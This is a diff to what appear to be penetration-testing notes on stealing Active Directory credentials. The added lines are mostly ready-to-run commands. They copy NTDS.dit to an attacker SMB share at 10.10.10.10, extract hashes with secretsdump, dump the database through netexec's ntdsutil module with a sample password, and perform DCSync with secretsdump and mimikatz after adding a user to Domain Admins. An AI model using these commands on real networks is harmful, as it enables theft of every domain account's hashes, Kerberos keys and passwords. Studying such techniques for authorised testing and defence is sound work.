@@ -48,5 +48,38 @@ python3 smbserver.py --smb2support CompData /tmp/share
 ```
 then move to attacker for dumping: 
 ```powershell
-cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.10.10
+cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.10.10\COmpData 
 ```
+then use secrets dump 
+```bash 
+secretsdump.py -ntds NTDS.dit -system SYSTEM local 
+```
+
+3. Using Netexec: The faster 
+```bash 
+netexec smb 10.10.10.10 -u username -p P@55w0rd! -M ntdsutil
+```
+
+4. Dysnc technique
+“Dcsync” emerges as a potent method for acquiring NTDS credentials, allowing access to hashes for domain accounts without the need for direct interaction with a domain controller or the extraction of the NTDS database.
+
+Dcsync technique empowers an attacker to pose as a DC, initiating requests to the Windows API for Active Directory synchronization and replication. Specifically, the `DSGetNCChanges` function within `DRSUAPI` plays a pivotal role in this Directory Replication Service (DRS) protocol.
+
+This can work on any provided one has requisite permissions. "**Replicating Directory Changes All**" and "**Replicating Directory Change"
+- Scenarios involving 
+	1. Using secretsdump for dsync 
+	```bash 
+	secretsdump.py administrator@10.10.10.10 
+	```
+	2. Mimikatz, requires login as the endowed user 
+	- FIrst add a new group, specify `Domain admins` object then `whoami /groups` to confirm 
+	- After transferring mimikatz , launch this command and
+	```bash 
+	lsadump::DCSync /domain: /user:
+	```
+	With this command, the curtains rise on a spectacle of information, revealing a treasure trove of insights: 
+	- User account information (SAM username, account type, account options…)
+	- Security ID (SID) and Relative ID (RID)
+	- Kerberos Keys 
+	- Plaintext password if the account has reversible encryption enabled.
+	
